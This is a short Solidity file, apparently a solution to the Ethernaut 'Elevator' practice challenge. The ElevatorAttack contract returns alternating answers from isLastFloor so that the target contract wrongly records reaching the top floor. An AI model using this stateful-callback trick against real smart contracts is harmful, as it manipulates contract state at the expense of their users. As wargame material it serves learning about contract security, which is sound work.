// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import "./Elevator.sol";
contract ElevatorAttack{
    bool toggle;
    Elevator public  target;
    constructor(address targetContract)public {

        toggle = true;
        target = Elevator(targetContract);

    }

    function isLastFloor(uint )public returns(bool){

        toggle = !toggle;
        return toggle;

    }

    function setTop(uint floor) public {

        target.goTo(floor);
    }


}